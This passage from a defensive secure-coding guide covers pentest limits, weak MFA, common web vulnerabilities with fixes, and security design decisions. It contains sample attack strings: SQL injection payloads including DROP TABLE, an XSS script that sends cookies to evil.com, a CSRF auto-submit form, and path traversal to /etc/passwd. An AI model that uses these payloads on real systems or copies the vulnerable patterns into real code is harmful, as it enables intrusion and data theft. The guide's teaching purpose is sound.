"Great job, team!"

Reality:
- Tester had no time
- Scope excluded sensitive areas
- Real attackers have no limits

THE REALITY:
Pentest quality varies wildly.
Scope limits findings.
Time limits depth.
Good pentests find things.

PENTEST LIMITATIONS:
- Time-boxed (attackers aren't)
- Scoped (attackers aren't)
- Announced (attackers aren't)
- Legal constraints (attackers none)

RED FLAGS:
- "No findings" (unlikely)
- Very short engagement
- No source code access
- Excluded important systems
- Same firm every year

THE FIX:
1. Quality over checkbox
   Choose firm for skill, not price.
   Reference check.
   Review sample reports.

2. Realistic scope
   Include critical systems.
   Test production (carefully).
   Allow social engineering.

3. Adequate time
   Complex app: 2-4 weeks
   Not: 2 days

4. Support the testers
   Provide documentation.
   Source code access.
   Answer questions.

5. Vary approaches
   External pentest
   Internal pentest
   Red team (full scope)
   Bug bounty (continuous)

PENTEST QUALITY SIGNS:
- Found real issues
- Clear reproduction steps
- Business impact explained
- Remediation guidance
- Deep technical detail
```

---

## Anti-Pattern 12: The False Sense of MFA

**What It Looks Like:**
"We have MFA, so accounts are secure."

**Why It Seems Right:**
- Second factor required
- Industry best practice
- Adds protection

**Why It Fails:**
```
THE PATTERN:
MFA enabled:
- SMS codes ✓
- Recovery via email ✓
- Remember device for 30 days ✓
- MFA optional for users ✓

"We have MFA!"

Reality:
- SMS is vulnerable (SIM swap)
- Email MFA is not MFA
- Long remember = no MFA
- Optional = not used

THE REALITY:
Not all MFA is equal.
Weak MFA is security theater.
Implementation matters.
Attackers bypass weak MFA.

MFA STRENGTH:
Strong:
- Hardware keys (YubiKey)
- TOTP (Authenticator apps)

Weak:
- SMS (SIM swap, SS7)
- Email (same account compromise)
- Push notifications (fatigue attacks)
- "Remember me" forever

THE FIX:
1. Strong factors
   // Priority order
   1. Hardware keys (FIDO2)
   2. Authenticator apps (TOTP)
   3. Push notifications (if rate-limited)
   4. SMS (better than nothing)

2. Mandatory for sensitive
   Admin accounts: Always MFA
   Financial access: Always MFA
   PII access: Always MFA

3. Short remember periods
   "Remember device": 7 days max
   Re-verify for sensitive actions

4. Phishing-resistant options
   WebAuthn/FIDO2 keys.
   Can't be phished.

5. MFA everywhere
   Login: MFA
   Password change: MFA
   Email change: MFA
   Admin actions: MFA

MFA CHECKLIST:
□ Strong second factor (not SMS-only)
□ Mandatory for privileged access
□ Reasonable remember periods
□ Phishing-resistant option available
□ Backup codes stored securely
```

## Sharp Edges (Gotchas)

*Real production issues that cause outages and bugs.*

# Sharp Edges: Cybersecurity

Critical security mistakes that lead to breaches, data loss, and regulatory nightmares.

---

## 1. The Hardcoded Secret

**Severity:** Critical
**Situation:** Credentials, API keys, or secrets committed to source code
**Why Dangerous:** Secrets in code get into version history, logs, and attacker hands.

```
THE TRAP:
// "Just for development"
const API_KEY = 'sk_live_abc123xyz789'
const DB_PASSWORD = 'production_password_2024'

// "I'll remove it before pushing"
git commit -m "Add feature"
git push origin main

// Secret is now in:
- Git history (forever)
- GitHub/GitLab servers
- Developer machines (clones)
- CI/CD logs
- Backup systems

THE REALITY:
Git history is forever.
Removing from latest commit ≠ removed.
Bot scanners find secrets in seconds.
One exposed key = full breach.

WHAT GETS LEAKED:
- AWS access keys
- Database passwords
- API keys (Stripe, Twilio, etc.)
- OAuth secrets
- JWT signing keys
- Encryption keys

THE FIX:
1. Use environment variables
   const apiKey = process.env.API_KEY

2. Use secrets managers
   const { data } = await vault.read('secret/api-key')

3. Use .gitignore properly
   .env
   .env.local
   *.pem
   secrets/

4. Pre-commit hooks
   # .pre-commit-config.yaml
   - repo: https://github.com/gitleaks/gitleaks
     hooks:
       - id: gitleaks

5. If already leaked:
   - Rotate immediately (new credentials)
   - Old ones are compromised
   - History cleanup is not enough

TOOLS:
- gitleaks: Pre-commit scanning
- trufflehog: History scanning
- git-secrets: AWS-focused
- Doppler/Vault: Secrets management
```

---

## 2. The SQL Injection Opening

**Severity:** Critical
**Situation:** Building SQL queries with string concatenation
**Why Dangerous:** Attackers can read, modify, or delete entire databases.

```
THE TRAP:
// Direct string concatenation
const query = `SELECT * FROM users WHERE id = ${userId}`
const query = "SELECT * FROM users WHERE name = '" + name + "'"

// What happens with malicious input:
userId = "1; DROP TABLE users;--"
name = "'; DELETE FROM users WHERE '1'='1"

// Attacker now controls your database

THE REALITY:
SQL injection is #1 on OWASP Top 10.
It's fully preventable.
One vulnerable endpoint = full database access.
Automated tools find and exploit in minutes.

INJECTION PATTERNS:
- Read all data: ' OR '1'='1
- Delete data: '; DROP TABLE users;--
- Bypass auth: ' OR 1=1--
- Time-based blind: '; WAITFOR DELAY '0:0:5'--

THE FIX:
1. Parameterized queries (ALWAYS)
   // Node/PostgreSQL
   const { rows } = await pool.query(
     'SELECT * FROM users WHERE id = $1',
     [userId]
   )

   // With ORM (Prisma)
   const user = await prisma.user.findUnique({
     where: { id: userId }
   })

2. Never concatenate user input
   // NEVER
   `SELECT * FROM users WHERE id = ${userInput}`

   // ALWAYS
   query('SELECT * FROM users WHERE id = $1', [userInput])

3. Use ORM for most queries
   ORMs parameterize by default.
   Raw SQL only when necessary.

4. Input validation (defense in depth)
   if (!isValidUUID(userId)) {
     throw new ValidationError()
   }

5. Least privilege database user
   App DB user should NOT have DROP, GRANT permissions
```

---

## 3. The XSS Vulnerability

**Severity:** Critical
**Situation:** Rendering untrusted data without proper encoding
**Why Dangerous:** Attackers can steal sessions, credentials, and execute code as users.

```
THE TRAP:
// Dangerous: Direct HTML insertion
element.innerHTML = userComment
dangerouslySetInnerHTML={{ __html: userContent }}
document.write(userData)

// Attacker input:
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

// Result:
- Session cookies stolen
- Keyloggers installed
- Phishing content injected
- Cryptocurrency miners
- Malware distribution

THE REALITY:
XSS is #2 on OWASP Top 10.
Can be as dangerous as full database access.
Affects every user who views the content.
Persisted XSS hits everyone.

XSS TYPES:
Stored: Saved in database, affects all viewers
Reflected: In URL, affects clicked links
DOM-based: Client-side only, in JavaScript

THE FIX:
1. Use framework escaping (React, Vue)
   // React auto-escapes
   <div>{userContent}</div>  // Safe

   // NEVER unless absolutely necessary
   dangerouslySetInnerHTML

2. Encode output for context
   // HTML context
   const safe = escapeHtml(userInput)

   // URL context
   const safe = encodeURIComponent(userInput)

   // JavaScript context
   const safe = JSON.stringify(userInput)

3. Content Security Policy
   Content-Security-Policy: default-src 'self';
     script-src 'self';
     style-src 'self' 'unsafe-inline'

4. Sanitize HTML if required
   import DOMPurify from 'dompurify'
   const clean = DOMPurify.sanitize(dirty)

5. HTTPOnly cookies
   Set-Cookie: session=abc; HttpOnly; Secure

NEVER:
- innerHTML with user content
- eval() with user content
- document.write() with user content
- v-html in Vue with user content
```

---

## 4. The Missing Authentication

**Severity:** Critical
**Situation:** API endpoints or pages accessible without authentication
**Why Dangerous:** Anyone can access protected resources.

```
THE TRAP:
// Frontend checks but API doesn't
// Frontend:
if (user.isAdmin) {
  showAdminPanel()
}

// API:
app.get('/api/admin/users', (req, res) => {
  // No auth check!
  return getAllUsers()
})

// Attacker:
curl https://app.com/api/admin/users
// Returns all user data

THE REALITY:
Frontend is not a security boundary.
Anyone can call your API directly.
Every endpoint needs authentication.
"Hidden" URLs are not secure.

COMMON GAPS:
- Admin endpoints without auth
- API endpoints assuming frontend auth
- File download endpoints
- Webhook endpoints
- Internal APIs exposed

THE FIX:
1. Auth on every protected endpoint
   app.get('/api/admin/users', authMiddleware, (req, res) => {
     // Now protected
   })

2. Default deny
   // All routes protected by default
   app.use('/api/*', authMiddleware)

   // Explicitly allow public routes
   app.get('/api/public/*', publicMiddleware)

3. Verify on every request
   // Don't cache auth decisions
   // Check on each request
   const user = await verifyToken(req.headers.authorization)

4. Test with unauthenticated requests
   # Should return 401, not 200
   curl -X GET https://app.com/api/admin/users

5. API inventory
   Document all endpoints.
   Mark which need auth.
   Review regularly.

AUTH CHECKLIST:
□ All admin endpoints protected
□ All data endpoints protected
□ File/media endpoints protected
□ Webhooks verified
□ No auth bypass routes
```

---

## 5. The Missing Authorization

**Severity:** Critical
**Situation:** User can access another user's resources (IDOR/BOLA)
**Why Dangerous:** Users can read/modify other users' data.

```
THE TRAP:
// Authenticated but not authorized
app.get('/api/users/:id', authMiddleware, (req, res) => {
  const userId = req.params.id
  // Missing: Is req.user allowed to access userId?
  return getUser(userId)
})

// Attacker is user ID 1
// Requests: GET /api/users/2
// Gets user 2's data

THE REALITY:
Authentication ≠ Authorization.
"Who are you?" ≠ "What can you access?"
BOLA/IDOR is #1 API security risk.
Easy to exploit, often overlooked.

COMMON PATTERNS:
- GET /users/:id (access any user)
- GET /orders/:id (access any order)
- PUT /accounts/:id (modify any account)
- DELETE /files/:id (delete any file)

THE FIX:
1. Check ownership on every request
   app.get('/api/orders/:id', auth, async (req, res) => {
     const order = await getOrder(req.params.id)

     if (order.userId !== req.user.id) {
       return res.status(403).json({ error: 'Forbidden' })
     }

     return res.json(order)
   })

2. Scope queries to user
   // Instead of: getOrder(orderId)
   // Use: getUserOrder(userId, orderId)

   const order = await prisma.order.findFirst({
     where: {
       id: orderId,
       userId: req.user.id  // Scoped
     }
   })

3. Use UUIDs not sequential IDs
   // Sequential: Easy to enumerate
   /orders/1, /orders/2, /orders/3

   // UUID: Hard to guess
   /orders/550e8400-e29b-41d4-a716-446655440000

4. Role-based access
   if (!req.user.can('read', 'User', userId)) {
     return res.status(403).json({ error: 'Forbidden' })
   }

AUTHORIZATION CHECKLIST:
□ Every resource access checks ownership
□ Admin actions check admin role
□ Org resources check org membership
□ No sequential ID enumeration possible
```

---

## 6. The Insecure Password Storage

**Severity:** Critical
**Situation:** Passwords stored in plaintext, weak hashing, or reversible encryption
**Why Dangerous:** Database breach exposes all user credentials.

```
THE TRAP:
// Plaintext (worst)
user.password = req.body.password

// MD5/SHA1 (broken)
user.password = md5(req.body.password)

// SHA256 without salt (vulnerable to rainbow tables)
user.password = sha256(req.body.password)

// Reversible encryption (still recoverable)
user.password = encrypt(req.body.password, key)

THE REALITY:
Databases get breached.
Assume your password table will be stolen.
Proper hashing is the last line of defense.
Weak hashing = millions of accounts compromised.

THE FIX:
1. Use bcrypt, argon2, or scrypt
   import bcrypt from 'bcrypt'

   // Hash password (on signup/change)
   const hash = await bcrypt.hash(password, 12)  // 12 rounds

   // Verify password (on login)
   const valid = await bcrypt.compare(password, hash)

2. Never store plaintext
   Even temporarily.
   Even in logs.
   Even in error messages.

3. Use high work factor
   // bcrypt: 10-12 rounds
   // argon2: memory 64MB, iterations 3

   Higher = slower attacks
   But also slower logins

4. Use password library
   Don't implement yourself.
   Use proven libraries.

5. Consider password requirements
   - Minimum length (12+)
   - Check against breach lists
   - Don't require complex rules
   - Allow paste (password managers)

HASHING ALGORITHMS:
✓ bcrypt (battle-tested)
✓ argon2id (modern, recommended)
✓ scrypt (high memory)
✗ MD5 (broken)
✗ SHA1 (broken)
✗ SHA256 alone (rainbow tables)
```

---

## 7. The CSRF Vulnerability

**Severity:** High
**Situation:** State-changing requests without CSRF protection
**Why Dangerous:** Attackers can perform actions as authenticated users.

```
THE TRAP:
// User is logged into bank.com
// User visits evil.com

// evil.com contains:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>

// Browser sends cookies automatically
// Transfer happens as user

THE REALITY:
Browsers send cookies with every request.
Including requests from other sites.
User doesn't have to click anything.
One visit to malicious site = attack.

CSRF ATTACK SURFACE:
- Form submissions
- POST/PUT/DELETE requests
- Any state-changing operation
- Especially financial/sensitive

THE FIX:
1. CSRF tokens
   // Generate per session
   const csrfToken = generateCsrfToken()
   req.session.csrf = csrfToken

   // Include in forms
   <input type="hidden" name="_csrf" value="${csrfToken}" />

   // Validate on submission
   if (req.body._csrf !== req.session.csrf) {
     throw new Error('CSRF validation failed')
   }

2. SameSite cookies
   Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly

3. Custom headers for AJAX
   // AJAX requests from other origins can't set custom headers
   fetch('/api/action', {
     headers: { 'X-CSRF-Token': token }
   })

4. Origin header checking
   const origin = req.get('Origin')
   if (!allowedOrigins.includes(origin)) {
     throw new Error('Invalid origin')
   }

5. Framework protections
   Most frameworks have CSRF middleware.
   Use it.

CSRF PROTECTION LEVELS:
- Token in forms (traditional)
- SameSite=Lax cookies (modern default)
- SameSite=Strict (most secure)
- Double submit cookie pattern
```

---

## 8. The Broken Session Management

**Severity:** High
**Situation:** Sessions that are predictable, never expire, or improperly invalidated
**Why Dangerous:** Sessions can be hijacked, reused, or remain active forever.

```
THE TRAP:
// Predictable session IDs
sessionId = `user_${userId}_${timestamp}`
// Attacker can guess: user_1234_1705123456

// Sessions never expire
const session = createSession({ expiresIn: null })

// Sessions not invalidated on logout
app.post('/logout', (req, res) => {
  res.clearCookie('session')  // Client side only!
  // Session still valid on server
})

// Session not rotated after auth
// Pre-auth session ID reused after login
// Session fixation vulnerability

THE REALITY:
Sessions are the keys to the kingdom.
Weak sessions = account takeover.
Stale sessions = persistent access.
Poor logout = sessions live forever.

THE FIX:
1. Cryptographically random session IDs
   import { randomBytes } from 'crypto'
   const sessionId = randomBytes(32).toString('hex')

2. Set appropriate expiration
   const session = createSession({
     expiresIn: '1h',           // Absolute
     inactiveTimeout: '15m'     // Inactivity
   })

3. Invalidate on logout (server-side)
   app.post('/logout', (req, res) => {
     await destroySession(req.sessionId)  // Server invalidation
     res.clearCookie('session')
   })

4. Rotate session after authentication
   app.post('/login', async (req, res) => {
     const user = await authenticate(req.body)

     // Destroy old session
     await destroySession(req.sessionId)

     // Create new session
     const newSession = await createSession(user.id)

     res.cookie('session', newSession.id)
   })

5. Invalidate on sensitive changes
   On password change: Invalidate all sessions
   On permission change: Invalidate sessions
   On suspicious activity: Invalidate sessions

SESSION CHECKLIST:
□ Random, unpredictable IDs
□ Expiration set (absolute and inactive)
□ Server-side invalidation on logout
□ Session rotation on auth
□ Secure cookie flags (HttpOnly, Secure, SameSite)
```

---

## 9. The Exposed Error Details

**Severity:** High
**Situation:** Detailed error messages, stack traces, or debug info in production
**Why Dangerous:** Helps attackers understand your system and find vulnerabilities.

```
THE TRAP:
// In production:
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    query: req.query,
    sqlQuery: err.sql,
    config: process.env
  })
})

// Attacker sees:
{
  "error": "ER_DUP_ENTRY: Duplicate entry 'admin' for key 'users.email'",
  "stack": "at Query.Sequence._packetToError (mysql/lib/...)",
  "sqlQuery": "INSERT INTO users (email, role) VALUES ('admin', 'admin')",
  "config": { "DB_PASSWORD": "prod123", ... }
}

THE REALITY:
Error details reveal:
- Database schema
- Technology stack
- File paths
- Configuration
- Credentials
- Valid usernames/data

THE FIX:
1. Generic errors in production
   app.use((err, req, res, next) => {
     // Log full error internally
     logger.error(err)

     // Return generic message
     if (process.env.NODE_ENV === 'production') {
       return res.status(500).json({
         error: 'An error occurred',
         requestId: req.id  // For support
       })
     }

     // Details in development only
     return res.status(500).json({
       error: err.message,
       stack: err.stack
     })
   })

2. Don't leak in validation errors
   // Bad
   "Password must match user admin@company.com"

   // Good
   "Invalid credentials"

3. Consistent error responses
   // Don't reveal if user exists
   // Bad: "No user with that email"
   // Bad: "Incorrect password"
   // Good: "Invalid email or password"

4. Hide headers
   app.disable('x-powered-by')

   Server: nginx  // Not "Express 4.17.1"

5. Log internally, not externally
   Errors go to logging system.
   Not to response body.
```

---

## 10. The Insecure Direct Object Reference

**Severity:** High
**Situation:** Using user-supplied identifiers without validation
**Why Dangerous:** Path traversal, arbitrary file access, data exposure.

```
THE TRAP:
// File download
app.get('/download', (req, res) => {
  const file = req.query.file
  res.download(`/uploads/${file}`)
})

// Attacker request:
GET /download?file=../../../etc/passwd
GET /download?file=../../config/database.yml

// Result: Server files exposed

// Template inclusion
const template = req.query.template
res.render(`templates/${template}`)

// Attacker request:
GET /page?template=../../../etc/passwd

THE REALITY:
User input should never be used in:
- File paths
- Template names
- Include statements
- Database table names

THE FIX:
1. Whitelist allowed values
   const allowedTemplates = ['home', 'about', 'contact']

   if (!allowedTemplates.includes(req.query.template)) {
     return res.status(400).json({ error: 'Invalid template' })
   }

2. Map to safe values
   const fileMap = {
     'report': '/uploads/report.pdf',
     'invoice': '/uploads/invoice.pdf'
   }

   const file = fileMap[req.query.file]
   if (!file) return res.status(404)

3. Validate paths
   const path = require('path')

   const requestedPath = path.join('/uploads', req.query.file)
   const resolvedPath = path.resolve(requestedPath)

   if (!resolvedPath.startsWith('/uploads/')) {
     return res.status(403).json({ error: 'Access denied' })
   }

4. Indirect references
   // Instead of: /files/secret_report.pdf
   // Use: /files/a1b2c3d4-uuid
   // Map internally to actual file

5. Principle of least access
   Process runs with minimal file system access.
   Can only read from intended directories.
```

---

## 11. The Weak Cryptography

**Severity:** High
**Situation:** Using deprecated algorithms or implementing crypto incorrectly
**Why Dangerous:** Encryption can be broken, data exposed.

```
THE TRAP:
// Weak algorithms
const encrypted = crypto.createCipher('des', key)  // DES is broken
const hash = crypto.createHash('md5')  // MD5 is broken

// ECB mode (patterns visible)
crypto.createCipheriv('aes-256-ecb', key, null)

// Predictable IVs
const iv = Buffer.from('0000000000000000')

// Hardcoded keys
const key = 'my-secret-encryption-key-12345'

THE REALITY:
Crypto is hard.
One mistake = no security.
Deprecated algorithms are deprecated for a reason.
Custom crypto is almost always wrong.

THE FIX:
1. Use modern algorithms
   // Symmetric: AES-256-GCM
   const cipher = crypto.createCipheriv(
     'aes-256-gcm',
     key,
     iv
   )

   // Asymmetric: RSA-OAEP with 2048+ bits
   // Or: Ed25519, X25519

   // Hashing: SHA-256, SHA-3
   // Password: bcrypt, argon2id

2. Use proper modes
   // GCM provides encryption + authentication
   'aes-256-gcm'  // Good
   'aes-256-cbc'  // Okay with HMAC
   'aes-256-ecb'  // Never

3. Random IVs
   const iv = crypto.randomBytes(16)
   // Store IV with ciphertext (it's not secret)

4. Use libraries
   // Node.js: libsodium, tweetnacl
   // Web: Web Crypto API
   // Don't implement yourself

5. Key management
   // Don't hardcode keys
   // Use key derivation for passwords
   // Rotate keys periodically
   // Store keys securely (HSM, KMS)

CRYPTO CHECKLIST:
□ AES-256-GCM or ChaCha20-Poly1305
□ Random IVs for each encryption
□ Keys from secure key store
□ HTTPS for transport
□ Certificate pinning for mobile
□ No deprecated algorithms
```

---

## 12. The Unvalidated Redirect

**Severity:** Medium
**Situation:** Redirecting users based on user-supplied URLs
**Why Dangerous:** Phishing attacks, credential theft, malware distribution.

```
THE TRAP:
// Open redirect
app.get('/redirect', (req, res) => {
  res.redirect(req.query.url)
})

// Legitimate use:
/redirect?url=/dashboard

// Attacker use:
/redirect?url=https://evil.com/fake-login

// User sees: yoursite.com/redirect?url=...
// Trusts it because it's your domain
// Gets redirected to phishing site

THE REALITY:
Open redirects enable:
- Phishing (fake login pages)
- Malware distribution
- OAuth token theft
- Trust exploitation

"It's just a redirect" = underestimated risk

THE FIX:
1. Whitelist allowed destinations
   const allowedRedirects = [
     '/dashboard',
     '/settings',
     '/logout'
   ]

   if (!allowedRedirects.includes(req.query.url)) {
     return res.redirect('/')
   }

2. Validate URL is internal
   function isInternalUrl(url) {
     try {
       const parsed = new URL(url, 'https://yoursite.com')
       return parsed.hostname === 'yoursite.com'
     } catch {
       return false
     }
   }

3. Use indirect references
   // Instead of: /redirect?url=https://...
   // Use: /redirect?target=dashboard
   // Map 'dashboard' to internal URL

4. Add warning for external
   if (isExternal(url)) {
     res.render('external-warning', { url })
   }

5. No URL in parameters
   // Instead of passing URL
   // Pass action/target name
   // Resolve URL on server

REDIRECT SAFETY:
□ No full URLs in parameters
□ Whitelist allowed destinations
□ Validate same-origin
□ Warn for external links
□ Log redirect requests
```

## Decision Framework

# Decisions: Cybersecurity

Critical security decisions that determine your application's security posture.

---

## Decision 1: Authentication Method

**Context:** Choosing how users prove their identity.

**Options:**

| Method | Security | UX | Best For |
|--------|----------|-----|----------|
| **Password only** | Low | Simple | Low-risk apps |
| **Password + MFA** | High | Moderate | Standard apps |
| **Passwordless** | High | Good | Modern apps |
| **SSO/OAuth** | High | Great | Enterprise |

**Framework:**
```
Authentication selection:

PASSWORD ONLY:
When: Low-risk, internal tools
Requirements: Strong password policy
Risk: Credential stuffing, phishing

PASSWORD + MFA:
When: Standard applications
Implementation:
- TOTP (recommended)
- Hardware keys (best)
- SMS (fallback only)
Risk: MFA fatigue, recovery bypass

PASSWORDLESS:
When: Modern consumer apps
Methods:
- Magic links (email)
- WebAuthn (biometrics, keys)
- Passkeys (cross-device)
Risk: Email security dependency

SSO/OAUTH:
When: Enterprise, B2B
Providers: Okta, Auth0, Azure AD
Benefits: Centralized identity
Risk: Provider dependency

DECISION FACTORS:
1. Risk level of data/actions
2. User technical sophistication
3. Compliance requirements
4. Integration needs

IMPLEMENTATION PRIORITY:
1. Get auth working
2. Add MFA
3. Consider passwordless
4. Add SSO if needed

PASSWORD REQUIREMENTS:
- 12+ characters minimum
- Breach list checking
- Rate limiting on attempts
- Account lockout policy
```

**Default Recommendation:** Password + TOTP MFA for most apps. Passwordless for consumer. SSO for enterprise.

---

## Decision 2: Session Management Strategy

**Context:** How to manage authenticated sessions.

**Options:**

| Strategy | Statefulness | Scalability | Security |
|----------|--------------|-------------|----------|
| **Server sessions** | Stateful | Lower | Higher |
| **JWT tokens** | Stateless | Higher | Moderate |
| **Hybrid** | Mixed | High | High |
| **OAuth tokens** | External | Variable | High |

**Framework:**
```
Session strategy selection:

SERVER SESSIONS:
Storage: Redis, database
Pros:
- Easy revocation
- Server controls validity
- No token size limits
Cons:
- Requires session store
- Scaling complexity

Implementation:
const session = await sessions.create({
  userId: user.id,
  expiresAt: addHours(now, 24)
})
res.cookie('session', session.id, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax'
})

JWT TOKENS:
Pros:
- Stateless
- Easy to scale
- Self-contained
Cons:
- Hard to revoke
- Token size in requests
- Refresh token complexity

Implementation:
const token = jwt.sign(
  { userId: user.id },
  SECRET,
  { expiresIn: '15m' }
)
// Plus refresh token flow

HYBRID (Recommended):
Short-lived JWT (15min) + long-lived refresh
Access: Stateless, fast
Refresh: Stateful, revocable

Implementation:
Access token: 15 min, JWT
Refresh token: 7 days, server-stored
Revocation: Delete refresh token

EXPIRATION SETTINGS:
Access token: 15-60 minutes
Refresh token: 1-30 days
Inactive timeout: 15-60 minutes
Absolute timeout: 24 hours - 30 days

COOKIE FLAGS:
HttpOnly: true (always)
Secure: true (always in prod)
SameSite: lax or strict
Path: / or specific
```

**Default Recommendation:** Hybrid (short-lived JWT + server-stored refresh tokens) for most apps.

---

## Decision 3: Authorization Model

**Context:** How to control access to resources.

**Options:**

| Model | Granularity | Complexity | Best For |
|-------|-------------|------------|----------|
| **RBAC** | Role-level | Low | Most apps |
| **ABAC** | Attribute-level | High | Complex rules |
| **ReBAC** | Relationship | Medium | Social/collab |
| **ACL** | Resource-level | Medium | File systems |

**Framework:**
```
Authorization model selection:

RBAC (Role-Based):
Define: Roles have permissions
Assign: Users have roles
Check: User's roles have permission?

Example:
roles = {
  admin: ['*'],
  editor: ['read', 'write'],
  viewer: ['read']
}

Best for:
- Clear role hierarchies
- Moderate permission needs
- Most applications

ABAC (Attribute-Based):
Define: Policies with conditions
Check: Evaluate against context

Example:
policy: allow if
  user.department == resource.department
  AND time.hour >= 9 AND time.hour <= 17
  AND user.clearance >= resource.classification

Best for:
- Complex access rules
- Dynamic conditions
- Compliance requirements

ReBAC (Relationship-Based):
Define: Relationships between entities
Check: Traverse relationship graph

Example:
user -> member_of -> team -> owns -> document
Can user read document? Follow the graph.

Best for:
- Collaborative apps
- Social platforms
- Shared resources

IMPLEMENTATION:
// Simple RBAC
function can(user, action, resource) {
  const permissions = getRolePermissions(user.role)
  return permissions.includes(action)
    || permissions.includes('*')
}

// With resource ownership
function can(user, action, resource) {
  if (resource.ownerId === user.id) return true
  return checkRolePermission(user.role, action)
}

AUTHORIZATION CHECKLIST:
□ Every endpoint checked
□ Resource ownership verified
□ Admin bypass explicit
□ Denial logged
□ Tested with different roles
```

**Default Recommendation:** RBAC for most apps. Add ownership checks. Consider ABAC for complex compliance.

---

## Decision 4: Data Encryption Strategy

**Context:** What to encrypt and how.

**Options:**

| Level | Coverage | Performance | Complexity |
|-------|----------|-------------|------------|
| **Transport only** | In transit | Minimal | Low |
| **At rest** | Stored data | Low | Medium |
| **Field-level** | Sensitive fields | Medium | High |
| **End-to-end** | Full path | Higher | Very high |

**Framework:**
```
Encryption levels:

TRANSPORT (TLS):
Always required.
TLS 1.2 minimum, 1.3 preferred.
Covers: Data in transit.

AT REST:
Database encryption (transparent).
File system encryption.
Covers: Stored data.

FIELD-LEVEL:
Specific sensitive fields.
Application manages keys.
Covers: PII, financial data.

END-TO-END:
Client encrypts, server can't read.
For: Messaging, sensitive docs.
Complexity: Key management.

WHAT TO ENCRYPT:

ALWAYS (At minimum):
- Transport: TLS everywhere
- Passwords: bcrypt/argon2 (hash, not encrypt)
- PII: Field-level encryption

RECOMMENDED:
- Database at rest encryption
- Backup encryption
- File storage encryption

CONSIDER:
- End-to-end for messaging
- Client-side encryption for sensitive docs

ALGORITHM SELECTION:
Symmetric: AES-256-GCM
Asymmetric: RSA-2048+, Ed25519
Hashing: SHA-256, SHA-3
Password: bcrypt, argon2id

KEY MANAGEMENT:
Development: Environment variables
Production: KMS (AWS, GCP, Azure, Vault)
Rotation: Annual minimum, automated preferred

ENCRYPTION CHECKLIST:
□ TLS everywhere
□ Strong cipher suites
□ Passwords hashed (not encrypted)
□ PII encrypted at rest
□ Keys in secure storage
□ Rotation plan exists
```

**Default Recommendation:** TLS everywhere, database encryption at rest, field-level for PII, KMS for key management.

---

## Decision 5: Secrets Management Approach

**Context:** How to store and access application secrets.

**Options:**

| Approach | Security | Complexity | Best For |
|----------|----------|------------|----------|
| **Env vars** | Low | Low | Development |
| **Config files** | Low | Low | Legacy |
| **Secret manager** | High | Medium | Production |
| **Vault** | Highest | High | Enterprise |

**Framework:**
```
Secrets management:

ENVIRONMENT VARIABLES:
When: Development, simple deployments
Risks: Can leak in logs, process lists
Better than: Hardcoded secrets

Implementation:
DATABASE_URL=postgres://localhost/dev
# Set by platform, not in code

SECRET MANAGER:
When: Production applications
Options:
- AWS Secrets Manager
- GCP Secret Manager
- Azure Key Vault
- Doppler

Implementation:
const secret = await secretsManager.getSecretValue({
  SecretId: 'prod/database/password'
})

VAULT (HashiCorp):
When: Enterprise, complex requirements
Features:
- Dynamic secrets
- Fine-grained access
- Audit logging
- Automatic rotation

Implementation:
const { data } = await vault.read('secret/data/database')
const password = data.password

SECRETS CATEGORIES:
Database credentials: Secret manager
API keys: Secret manager
Encryption keys: KMS
JWT signing: Secret manager or KMS
OAuth secrets: Secret manager

ROTATION:
Automatic: Preferred
Manual: Scheduled (quarterly)
Emergency: On suspicion of leak

NEVER:
- Hardcode in source
- Commit to git
- Log secret values
- Share in Slack/email
- Store in plain text files

ACCESS CONTROL:
Principle of least privilege.
Service A only accesses its secrets.
Audit who accessed what.
```

**Default Recommendation:** Secret manager for production (AWS/GCP/Azure native). Vault for enterprise with dynamic secrets.

---

## Decision 6: Security Scanning Strategy

**Context:** What security testing to automate.

**Options:**

| Type | Finds | When | Coverage |
|------|-------|------|----------|
| **SAST** | Code issues | Build time | Source code |
| **DAST** | Runtime issues | Deploy time | Running app |
| **SCA** | Dependencies | Build time | Libraries |
| **Container** | Image issues | Build time | Containers |

**Framework:**
```
Security scanning stack:

SAST (Static Analysis):
Tools: Semgrep, CodeQL, SonarQube
Runs: Every PR, before merge
Finds:
- SQL injection patterns
- XSS vulnerabilities
- Hardcoded secrets
- Insecure patterns

Integration:
# GitHub Actions
- uses: returntocorp/semgrep-action@v1
  with:
    config: p/owasp-top-ten

SCA (Software Composition):
Tools: Snyk, Dependabot, npm audit
Runs: Daily, on PR
Finds:
- Vulnerable dependencies
- Outdated packages
- License issues

Integration:
- run: npm audit --audit-level=high
- uses: snyk/actions/node@master

DAST (Dynamic Analysis):
Tools: OWASP ZAP, Burp Suite, Nuclei
Runs: Post-deploy, nightly
Finds:
- Missing headers
- Misconfigurations
- Runtime vulnerabilities

Integration:
- uses: zaproxy/action-full-scan@v0
  with:
    target: 'https://staging.example.com'

CONTAINER SCANNING:
Tools: Trivy, Snyk Container, Clair
Runs: On image build
Finds:
- OS vulnerabilities
- Package vulnerabilities
- Misconfigurations

Integration:
- uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:${{ github.sha }}'

SECRET SCANNING:
Tools: Gitleaks, TruffleHog
Runs: Pre-commit, on push
Finds: Leaked credentials

SCAN PRIORITY:
1. SCA (dependencies) - daily
2. SAST (code) - every PR
3. Secret scanning - every commit
4. Container scanning - every build
5. DAST - nightly/weekly
```

**Default Recommendation:** SAST + SCA on every PR. Secret scanning pre-commit. DAST on staging. Container scanning on build.

---

## Decision 7: Vulnerability Handling Policy

**Context:** How to respond to discovered vulnerabilities.

**Options:**

| Severity | Response Time | Action |
|----------|---------------|--------|
| **Critical** | < 24 hours | Immediate fix |
| **High** | < 7 days | Prioritize |
| **Medium** | < 30 days | Schedule |
| **Low** | < 90 days | Backlog |

**Framework:**
```
Vulnerability response:

SEVERITY DEFINITIONS:
Critical (CVSS 9.0-10.0):
- Remote code execution
- Authentication bypass
- Data breach risk
Timeline: Fix within 24 hours

High (CVSS 7.0-8.9):
- Privilege escalation
- Sensitive data exposure
- Significant impact
Timeline: Fix within 7 days

Medium (CVSS 4.0-6.9):
- Limited impact
- Requires conditions
- Defense in depth gap
Timeline: Fix within 30 days

Low (CVSS 0.1-3.9):
- Minimal impact
- Hard to exploit
- Information disclosure
Timeline: Fix within 90 days

RESPONSE PROCESS:
